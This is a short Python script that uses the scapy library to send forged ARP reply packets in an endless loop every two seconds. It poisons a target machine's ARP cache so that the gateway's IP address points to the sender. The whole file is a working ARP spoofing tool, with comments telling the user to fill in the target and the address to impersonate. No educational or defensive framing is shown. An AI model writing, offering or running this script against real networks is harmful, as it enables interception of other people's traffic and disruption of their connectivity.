from scapy.all import ARP, Ether, sendp
import time

def refined_arp_spoof(target_ip, spoof_ip, iface):
    # Craft the Ethernet frame and ARP packet
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
    arp_packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    packet = ether_frame / arp_packet
    sendp(packet, iface=iface, verbose=False)

if __name__ == "__main__":
    target_ip = "192.168.1.133"  # Replace with the IP of the target machine
    spoof_ip = "192.168.1.1"     # Replace with the IP you want to spoof (e.g., gateway)
    iface = "Wi-Fi"              # Replace with the interface name
    while True:
        refined_arp_spoof(target_ip, spoof_ip, iface)
        time.sleep(2)  # Sleep for 2 seconds before sending the next spoofed ARP packet
